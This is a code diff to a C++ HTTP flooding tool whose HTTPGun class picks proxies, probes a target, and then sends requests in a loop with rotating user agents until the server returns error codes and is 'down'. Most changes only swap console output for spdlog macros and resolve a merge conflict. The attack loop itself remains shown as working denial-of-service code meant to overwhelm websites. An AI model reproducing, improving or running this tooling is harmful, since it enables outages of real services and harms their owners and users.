@@ -8,7 +8,6 @@
 #include "globals.h"
 
 using namespace Attackers;
-namespace spd = spdlog;
 
 std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noexcept
 {
@@ -28,12 +27,11 @@ std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noex
 			{
 				return proxy;
 			}
-			std::cerr << "Proxy: " << proxy.first << "@" << 
-				proxy.second << " failed with code: " << *respCode << std::endl;
+			SPDLOG_ERROR("Proxy: {}@{} failed with code: {}", proxy.first, proxy.second, *respCode);
 		}
 		else
 		{
-			std::cerr << "Proxy: " << proxy.first << "@" << proxy.second << " failed" << std::endl;
+		SPDLOG_ERROR("Proxy: {}@{} failed", proxy.first, proxy.second);
 		}
 	}
 
@@ -84,10 +82,10 @@ std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
 
 	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS, &receivedHeaders)})
 	{
-		std::cout << "Got: " << *targetRespCode << " without proxy" << std::endl;
+		SPDLOG_INFO("Got: {} without proxy", *targetRespCode);
 		if(*targetRespCode >= 200 && *targetRespCode < 400)
 		{
-			std::cout << "Firing without proxy" << std::endl;
+			SPDLOG_INFO("Firing without proxy");
 
 			if(*targetRespCode >= 300)
 			{
@@ -105,7 +103,7 @@ std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
 			return {};
 		}
 	}
-	std::cout << "Failed to check host without proxy" << std::endl;
+	SPDLOG_INFO("Failed to check host without proxy");
 	// Trying to aim with proxy
 	if(!SetValidProxy())
 	{
@@ -131,8 +129,7 @@ void HTTPGun::FireTillDead(const Target &targetToKill) noexcept
 {
 	if(!m_currentProxy)
 	{
-
-		spd::get("console")->info("Attacking without proxy");
+		SPDLOG_INFO("Attacking {} without proxy", targetToKill.address);
 		if(AttackWithNoProxy(targetToKill))
 		{
 			return;
@@ -141,10 +138,9 @@ void HTTPGun::FireTillDead(const Target &targetToKill) noexcept
 
 	if(!m_currentTask.ShouldStop() && m_currentProxy)
 	{
-		spd::get("console")->info("Attacking with proxy");
+		SPDLOG_INFO("Attacking {} with proxy", targetToKill.address);
 		AttackWithProxy(targetToKill);
 	}
-	
 }
 
 bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
@@ -156,8 +152,6 @@ bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
 
 	wrapper.SetTarget(targetToKill.address);
 
-	auto console = spd::get("console");
-	console->info("Starting attack without proxy at {}", targetToKill.address);
 	while(!m_currentTask.ShouldStop())
 	{
 		headers["User-Agent"] = ChoseUseragent();
@@ -169,24 +163,20 @@ bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
 			{
 				return true;
 			}
-			else if(*respCode >= 200 && *respCode < 300)
-			{
-				std::cout << "Succesfuly attacked!" << std::endl;
-			}
 			else if(*respCode >= 400 && *respCode < 500)
 			{
-				console->warn("Max errors count reached, retrying");
+				SPDLOG_WARN("Max errors count reached, retrying");
 				return true;
 			}
 			else if(*respCode >= 500)
 			{
-				console->info("Target: {} is probably down, looking for others", targetToKill.address);
+				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill.address);
 				return false;
 			}
-			console->info("Succesfully attacked {}", targetToKill.address);
+			SPDLOG_INFO("Succesfully attacked {}", targetToKill.address);
 		}
 	}
-	console->info("Attack without proxy finished");
+	SPDLOG_INFO("Attack without proxy finished");
 
 	return false;
 }
@@ -202,14 +192,14 @@ void HTTPGun::AttackWithProxy(const Target &targetToKill) noexcept
 	while(!m_currentTask.ShouldStop())
 	{
 		// Setting proxies
-		std::cout << "Setting proxy" << std::endl;
+		SPDLOG_INFO("Setting proxy");
 		if(!m_currentProxy && !SetValidProxy())
 		{
 			return;
 		}
 
 		// Attacking
-		std::cout << "Attacking" << std::endl;
+		SPDLOG_INFO("Attacking");
 		size_t errorsCount{0};
 		for(size_t currentTry = 0; 
 			currentTry < ProxyConfig::MAX_PROXY_ATTACKS; currentTry++)
@@ -218,27 +208,22 @@ void HTTPGun::AttackWithProxy(const Target &targetToKill) noexcept
 			wrapper.SetHeaders(headers);
 
 			const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
-<<<<<<< HEAD
-			if((!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT) || 
-					g_shouldStop)
-=======
-			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
->>>>>>> fixes
+			if(m_currentTask.ShouldStop() || !respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
 			{
 				break;
 			}
 			else if(*respCode >= 400 && *respCode < 500)
 			{
-				std::cerr << "Target responded with not allowed code" << std::endl;
+				SPDLOG_WARN("Target {} responded with not allowed code", targetToKill.address);
 				break;
 			}
 			else if(*respCode >= 500)
 			{
-				std::cout << "Target: " << targetToKill.address << " is down, looking for others" << std::endl;
+				SPDLOG_INFO("Target: {} is down, looking for others", targetToKill.address);
 				return;
 			}
 		}
-		std::cout << "Current proxy exhausted, looking for other" << std::endl;
+		SPDLOG_WARN("Current proxy exhausted, looking for other");
 		m_currentProxy = std::nullopt;
 	}
 }
